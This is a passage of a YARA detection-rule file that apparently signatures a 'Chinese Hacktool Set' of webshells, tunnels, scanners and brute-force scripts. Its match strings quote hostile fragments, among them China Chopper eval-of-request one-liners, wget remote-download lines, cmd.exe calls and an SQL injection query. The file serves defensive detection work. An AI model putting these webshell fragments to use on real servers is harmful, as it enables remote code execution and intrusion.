https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$txt=fopen(\\\"oracle_info.txt\\\",\\\"w\\\");\" fullword ascii\n      $s1 = \"if(isset($_REQUEST['id']))\" fullword ascii\n      $s2 = \"$id=$_REQUEST['id'];\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Webshell_reDuhServers_reDuh_RID31DF : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file reDuh.jsp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:41:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"out.println(\\\"[Error]Unable to connect to reDuh.jsp main process on port \\\" +ser\" ascii\n      $s4 = \"System.out.println(\\\"IPC service failed to bind to \\\" + servicePort);\" fullword ascii\n      $s17 = \"System.out.println(\\\"Bound on \\\" + servicePort);\" fullword ascii\n      $s5 = \"outputFromSockets.add(\\\"[data]\\\"+target+\\\":\\\"+port+\\\":\\\"+sockNum+\\\":\\\"+new Strin\" ascii\n   condition: \n      filesize < 116KB and all of them\n}\n\nrule Webshell_item_old_RID2DF3 : CHINA DEMO T1105 T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file item-old.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:53:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1105, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$sCmd = \\\"wget -qc \\\".escapeshellarg($sURL).\\\" -O \\\".$sFile;\" fullword ascii\n      $s2 = \"$sCmd = \\\"convert \\\".$sFile.\\\" -flip -quality 80 \\\".$sFileOut;\" fullword ascii\n      $s3 = \"$sHash = md5($sURL);\" fullword ascii\n   condition: \n      filesize < 7KB and 2 of them\n}\n\nrule Webshell_Tools_2014_RID2DDD : CHINA DEMO T1007 T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file 2014.jsp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:50:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1007, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"((Invoker) ins.get(\\\"login\\\")).invoke(request, response,\" fullword ascii\n      $s4 = \"program = \\\"cmd.exe /c net start > \\\" + SHELL_DIR\" fullword ascii\n      $s5 = \": \\\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\cmd.exe\\\")\" fullword ascii\n   condition: \n      filesize < 715KB and all of them\n}\n\nrule Webshell_reDuhServers_reDuh_2_RID3270 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file reDuh.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 14:05:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"errorlog(\\\"FRONTEND: send_command '\\\".$data.\\\"' on port \\\".$port.\\\" returned \\\".\" ascii\n      $s2 = \"$msg = \\\"newData:\\\".$socketNumber.\\\":\\\".$targetHost.\\\":\\\".$targetPort.\\\":\\\".$seq\" ascii\n      $s3 = \"errorlog(\\\"BACKEND: *** Socket key is \\\".$sockkey);\" fullword ascii\n   condition: \n      filesize < 57KB and all of them\n}\n\nrule Webshell_Customize_5_RID2EFD : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file Customize.jsp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:38:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"while((l=br.readLine())!=null){sb.append(l+\\\"\\\\r\\\\n\\\");}}\" fullword ascii\n      $s2 = \"String Z=EC(request.getParameter(Pwd)+\\\"\\\",cs);String z1=EC(request.getParameter\" ascii\n   condition: \n      filesize < 30KB and all of them\n}\n\nrule Webshell_CN_Tools_old_RID2F45 : CHINA DEMO T1105 T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file old.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:50:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1105, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$sCmd = \\\"wget -qc \\\".escapeshellarg($sURL).\\\" -O \\\".$sFile;\" fullword ascii\n      $s1 = \"$sURL = \\\"http://\\\".$sServer.\\\"/\\\".$sFile;\" fullword ascii\n      $s2 = \"chmod(\\\"/\\\".substr($sHash, 0, 2), 0777);\" fullword ascii\n      $s3 = \"$sCmd = \\\"echo 123> \\\".$sFileOut;\" fullword ascii\n   condition: \n      filesize < 6KB and all of them\n}\n\nrule Webshell_item_301_RID2D48 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file item-301.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:25:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$sURL = \\\"301:http://\\\".$sServer.\\\"/index.asp\\\";\" fullword ascii\n      $s2 = \"(gov)\\\\\\\\.(cn)$/i\\\", $aURL[\\\"host\\\"])\" ascii\n      $s3 = \"$aArg = explode(\\\" \\\", $sContent, 5);\" fullword ascii\n      $s4 = \"$sURL = $aArg[0];\" fullword ascii\n   condition: \n      filesize < 3KB and 3 of them\n}\n\nrule Webshell_CN_Tools_item_RID2FB5 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file item.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 12:08:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$sURL = \\\"http://\\\".$sServer.\\\"/\\\".$sWget;\" fullword ascii\n      $s2 = \"$sURL = \\\"301:http://\\\".$sServer.\\\"/\\\".$sWget;\" fullword ascii\n      $s3 = \"$sWget=\\\"index.asp\\\";\" fullword ascii\n      $s4 = \"$aURL += array(\\\"scheme\\\" => \\\"\\\", \\\"host\\\" => \\\"\\\", \\\"path\\\" => \\\"\\\");\" fullword ascii\n   condition: \n      filesize < 4KB and all of them\n}\n\nrule Webshell_f3_diy_RID2CE4 : CHINA DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file diy.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:08:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@LANGUAGE=\\\"VBScript.Encode\\\" CODEPAGE=\\\"936\\\"%>\" fullword ascii\n      $s5 = \".black {\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 10KB and all of them\n}\n\nrule Webshell_ChinaChopper_temp_RID316F : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file temp.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:22:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"o.run \\\"ff\\\",Server,Response,Request,Application,Session,Error\" fullword ascii\n      $s1 = \"Set o = Server.CreateObject(\\\"ScriptControl\\\")\" fullword ascii\n      $s2 = \"o.language = \\\"vbscript\\\"\" fullword ascii\n      $s3 = \"o.addcode(Request(\\\"SC\\\"))\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule Webshell_Tools_2015_RID2DDE : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file 2015.jsp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:50:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Configbis = new BufferedInputStream(httpUrl.getInputStream());\" fullword ascii\n      $s4 = \"System.out.println(Oute.toString());\" fullword ascii\n      $s5 = \"String ConfigFile = Outpath + \\\"/\\\" + request.getParameter(\\\"ConFile\\\");\" fullword ascii\n      $s8 = \"HttpURLConnection httpUrl = null;\" fullword ascii\n      $s19 = \"Configbos = new BufferedOutputStream(new FileOutputStream(Outf));;\" fullword ascii\n   condition: \n      filesize < 7KB and all of them\n}\n\nrule Webshell_reDuhServers_reDuh_3_RID3271 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file reDuh.aspx\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 14:05:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Response.Write(\\\"[Error]Unable to connect to reDuh.jsp main process on port \\\" +\" ascii\n      $s2 = \"host = System.Net.Dns.Resolve(\\\"127.0.0.1\\\");\" fullword ascii\n      $s3 = \"rw.WriteLine(\\\"[newData]\\\" + targetHost + \\\":\\\" + targetPort + \\\":\\\" + socketNum\" ascii\n      $s4 = \"Response.Write(\\\"Error: Bad port or host or socketnumber for creating new socket\" ascii\n   condition: \n      filesize < 40KB and all of them\n}\n\nrule Webshell_ChinaChopper_temp_3_RID3201 : CHINA DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file temp.aspx\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:46:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@ Page Language=\\\"Jscript\\\"%><%eval(Request.Item[\\\"\" ascii\n      $s1 = \"\\\"],\\\"unsafe\\\");%>\" ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 150 and all of them\n}\n\nrule CN_Tools_xbat_RID2C20 : APT CHINA DEMO FILE SCRIPT {\n   meta:\n      description = \"Chinese Hacktool Set - file xbat.vbs\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:35:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, FILE, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ws.run \\\"srss.bat /start\\\",0 \" fullword ascii\n      $s1 = \"Set ws = Wscript.CreateObject(\\\"Wscript.Shell\\\")\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x6553 and filesize < 0KB and all of them\n}\n\nrule CN_Tools_srss_RID2C3C : APT CHINA DEMO SCRIPT {\n   meta:\n      description = \"Chinese Hacktool Set - file srss.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:40:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"srss.exe -idx 0 -ip\" \n      $s1 = \"-port 21 -logfilter \\\"_USER ,_P\" ascii\n   condition: \n      filesize < 100 and all of them\n}\n\nrule dll_UnReg_RID2A8D : APT CHINA DEMO SCRIPT T1218_010 {\n   meta:\n      description = \"Chinese Hacktool Set - file UnReg.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:46:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, SCRIPT, T1218_010\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"regsvr32.exe /u C:\\\\windows\\\\system32\\\\PacketX.dll\" fullword ascii\n      $s1 = \"del /F /Q C:\\\\windows\\\\system32\\\\PacketX.dll\" fullword ascii\n   condition: \n      filesize < 1KB and 1 of them\n}\n\nrule Pc_pc2015_RID29BE : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file pc2015.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 01:01:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\svchost.exe\" ascii\n      $s1 = \"LON\\\\OD\\\\O-\\\\O)\\\\O%\\\\O!\\\\O=\\\\O9\\\\O5\\\\O1\\\\O\" fullword ascii\n      $s8 = \"%s%08x.001\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 309KB and all of them\n}\n\nrule Cmdshell32_RID2AA2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Cmdshell32_RID2AA2.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 07:21:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmdshell.exe\" fullword wide\n      $s2 = \"cmdshell\" fullword ascii\n      $s3 = \"[Root@CmdShell ~]#\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 62KB and all of them\n}\n\nrule Dos_Down32_RID2A93 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Down32.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:56:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n      $s6 = \"down.exe\" fullword wide\n      $s15 = \"get_Form1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 137KB and all of them\n}\n\nrule dat_report_RID2B45 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file report.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:59:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<a href=\\\"http://www.xfocus.net\\\">X-Scan</a>\" fullword ascii\n      $s2 = \"REPORT-ANALYSIS-OF-HOST\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 480KB and all of them\n}\n\nrule SwitchSniffer_RID2C50 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file SwitchSniffer_RID2C50.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:43:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"NextSecurity.NET\" fullword wide\n      $s2 = \"SwitchSniffer_RID2C50 Setup\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}\n\nrule hscan_gui_RID2AC2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hscan-gui.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:15:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Hscan.EXE\" fullword wide\n      $s1 = \"RestTool.EXE\" fullword ascii\n      $s3 = \"Hscan Application \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them\n}\n\nrule Arp_EMP_v1_0_RID2B0A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Arp EMP v1.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:49:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Arp EMP v1.0.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule HTTPSCANNER_RID2A5B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file HTTPSCANNER_RID2A5B.EXE\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 05:23:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"HttpScanner.exe\" fullword wide\n      $s2 = \"HttpScanner\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3500KB and all of them\n}\n\nrule CN_Tools_pc_RID2B44 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file pc.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:59:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\svchost.exe\" ascii\n      $s2 = \"%s%08x.001\" fullword ascii\n      $s3 = \"Qy001Service\" fullword ascii\n      $s4 = \"/.MIKY\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PLUGIN_AJunk_RID2B18 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file AJunk.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:51:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"AJunk.dll\" fullword ascii\n      $s2 = \"AJunk.DLL\" fullword wide\n      $s3 = \"AJunk Dynamic Link Library\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 560KB and all of them\n}\n\nrule IISPutScannesr_RID2C6C : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file IISPutScannesr_RID2C6C.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:48:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"yoda & M.o.D.\" ascii\n      $s2 = \"-> come.to/f2f **************\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule CN_Tools_Temp_RID2C07 : APT CHINA DEMO FILE {\n   meta:\n      description = \"Chinese Hacktool Set - file Temp.war\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:31:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"META-INF/context.xml<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\" fullword ascii\n      $s1 = \"browser.jsp\" fullword ascii\n      $s3 = \"cmd.jsp\" fullword ascii\n      $s4 = \"index.jsp\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 203KB and all of them\n}\n\nrule sbin_squid_RID2B42 : APT CHINA DEMO SCRIPT T1007 {\n   meta:\n      description = \"Chinese Hacktool Set - file squid.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:58:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, SCRIPT, T1007\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"del /s /f /q\" fullword ascii\n      $s1 = \"squid.exe -z\" fullword ascii\n      $s2 = \"net start Squid\" fullword ascii\n      $s3 = \"net stop Squid\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule sql1433_creck_RID2B93 : APT CHINA DEMO FILE SCRIPT {\n   meta:\n      description = \"Chinese Hacktool Set - file creck.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:12:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, FILE, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"start anhao3.exe -i S.txt -p  pass3.txt -o anhao.txt -l Them.txt -t 1000\" fullword ascii\n      $s1 = \"start anhao1.exe -i S.txt -p  pass1.txt -o anhao.txt -l Them.txt -t 1000\" fullword ascii\n      $s2 = \"start anhao2.exe -i S.txt -p  pass2.txt -o anhao.txt -l Them.txt -t 1000\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x7473 and filesize < 1KB and 1 of them\n}\n\nrule sql1433_Start_RID2B99 : APT CHINA DEMO SCRIPT {\n   meta:\n      description = \"Chinese Hacktool Set - file Start.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:13:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n      $s2 = \"start creck.bat\" fullword ascii\n      $s3 = \"del s1.txt\" fullword ascii\n      $s4 = \"del Result.txt\" fullword ascii\n      $s5 = \"del s.TXT\" fullword ascii\n      $s6 = \"mode con cols=48 lines=20\" fullword ascii\n   condition: \n      filesize < 1KB and 2 of them\n}\n\nrule mswin_check_lm_group_RID2F60 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file mswin_check_lm_group_RID2F60.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:54:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-03-15\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Valid_Global_Groups: checking group membership of '%s\\\\%s'.\" fullword ascii\n      $s2 = \"Usage: %s [-D domain][-G][-P][-c][-d][-h]\" fullword ascii\n      $s3 = \"-D    default user Domain\" fullword ascii\n      $fp1 = \"Panda Security S.L.\" ascii wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 380KB and all of ( $s* ) and not 1 of ( $fp* )\n}\n\nrule WAF_Bypass_RID2AC0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file WAF-Bypass.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:11:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Email: blacksplitn@gmail.com\" fullword wide\n      $s2 = \"User-Agent:\" fullword wide\n      $s3 = \"Send Failed.in RemoteThread\" fullword ascii\n      $s4 = \"www.example.com\" fullword wide\n      $s5 = \"Get Domain:%s IP Failed.\" fullword ascii\n      $s6 = \"Connect To Server Failed.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 7992KB and 5 of them\n}\n\nrule MarathonTool_RID2BE9 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file MarathonTool_RID2BE9.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:26:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"MarathonTool_RID2BE9\" ascii\n      $s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n      $s18 = \"SELECT UNICODE(SUBSTRING((system_user),{0},1))\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1040KB and all of them\n}\n\nrule PLUGIN_TracKid_RID2BE1 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file TracKid.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:25:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"E-mail: cracker_prince@163.com\" fullword ascii\n      $s1 = \".\\\\TracKid Log\\\\%s.txt\" fullword ascii\n      $s2 = \"Coded by prince\" fullword ascii\n      $s3 = 